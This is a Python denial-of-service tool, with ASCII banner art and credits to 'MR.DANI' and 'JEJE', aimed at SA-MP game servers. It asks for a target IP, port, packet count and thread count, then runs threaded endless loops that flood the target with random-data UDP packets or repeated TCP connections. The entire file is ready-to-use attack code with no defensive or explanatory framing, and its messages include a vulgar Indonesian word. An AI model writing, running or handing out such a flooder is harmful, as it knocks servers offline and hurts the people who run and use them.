#!/usr/bin/env python3
#Code by MR.DANI
#REMAKE BY JEJE
import random
import socket
import threading
import sys
import os
from os import system, name

os.system("clear")
print("\033[31m =========================================================================")
print("\033[31m                                    » TOOLS BY REMAKE BY JEJE X MR DAANI«                              ")
print("\033[31m =========================================================================")
print("\033[31m ███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗")
print("\033[31m ████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║")
print("\033[31m ██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║")
print("\033[31m ██║╚██╔╝██║██╔══██╗░░░██║░░██║██╔══██║██║╚████║██║")
print("\033[31m ██║░╚═╝░██║██║░░██║██╗██████╔╝██║░░██║██║░╚███║██║")
print("\033[31m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝")
print("\033[31m »DDOS ATTACK FOR SAMP")
print("\033[31m »Script Ini Dibuat Hanya Untuk Team Mr.Dani")
print("=================================================================================")
ip = str(input(" HOST/IP:"))
port = int(input(" PORT:"))
choice = str(input(" SIAP UNTUK DDOS(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" ISI PACKETS:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[!]","[*]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" |  MR.DANI X Jeje |")
		except:
			print("[!] | Server Down!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[!]","[*]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Paket Dari Mr.Dani")
		except:
			s.close()
			print("[*] Error kontol")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
